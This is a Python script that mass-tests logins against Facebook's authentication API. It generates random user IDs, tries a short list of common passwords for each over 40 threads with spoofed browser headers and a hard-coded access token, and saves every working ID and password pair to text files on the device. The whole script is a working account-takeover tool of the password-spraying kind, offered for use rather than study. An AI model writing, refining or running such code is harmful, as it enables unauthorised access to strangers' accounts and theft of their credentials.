#!/usr/bin/python3

import os,time,random,json,sys
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool




def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx


def main():
    user=[]
    os.system("clear")
    limit=input(" input limit: ")
    print("—"*20)
    print("[1] RANDOM ")
    print("[2] OTHERS ")
    print("—"*20)
    ask=input("  SELECTED  !>")
    print("—"*20)
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        print(" SAAD")
        
        print("—"*20)
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mEHC\x1b[1;97m-\033[38;5;46mEMRAN\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
     'dpr': '2',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5752.225", "Google Chrome";v="116.0.5752.225"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '"220333QAG"',
    'sec-ch-ua-platform': '"macOS"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5752.225 Safari/537.36',
    'viewport-width': '980',
}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass


main()

























